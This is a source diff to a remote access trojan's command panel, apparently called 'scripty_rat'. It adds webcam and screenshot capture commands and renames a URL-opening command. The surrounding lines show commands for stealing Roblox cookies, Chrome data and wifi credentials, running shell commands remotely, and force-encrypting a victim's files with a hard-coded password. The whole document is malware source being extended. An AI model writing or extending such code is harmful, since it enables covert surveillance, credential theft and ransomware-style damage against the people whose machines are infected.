@@ -484,6 +484,8 @@
    !roblox            - Grab Roblox Cookie
    !chrome            - Steal Chrome Data
    !ip                - Get GeoIP Info
+   !screenshot        - Capture & Link Screenshot
+   !webcam            - Capture & Link Webcam
 
 💻 REMOTE EXECUTION:
    !exec <cmd>        - Run Shell Command
@@ -498,7 +500,7 @@
 🔊 MEDIA:
    !tts <text>        - Text to Speech
    !msgbox <msg>      - Popup Message
-   !url <link>        - Open Website
+   !open_url <link>        - Open Website
    !mute              - Mute Audio
    !unmute            - Unmute Audio
    !volume <0-100>    - Set Volume
@@ -613,6 +615,9 @@
                     break;
                 case '!wifi': pl.type='wifi_stealer'; break;
                 case '!roblox': pl.type='grab_roblox'; break;
+                case '!screenshot': pl.type='screenshot'; break;
+                case '!webcam': pl.type='webcam'; break;
+                
 
                 // ENCRYPTION
                 case '!encrypt': pl.type='force_encrypt'; pl.password=args||"scripty_rat_best_777"; break;
@@ -621,7 +626,7 @@
                 // MEDIA
                 case '!tts': pl.type='tts'; pl.text=args; break;
                 case '!msgbox': pl.type='msgbox'; pl.text=args; break;
-                case '!url': pl.type='open_url'; pl.url=args; break;
+                case '!open_url': pl.type='open_url'; pl.url=args; break;
                 case '!mute': pl.type='mute'; break;
                 case '!unmute': pl.type='unmute'; break;
                 case '!volume': pl.type='volume'; pl.value=args; break;
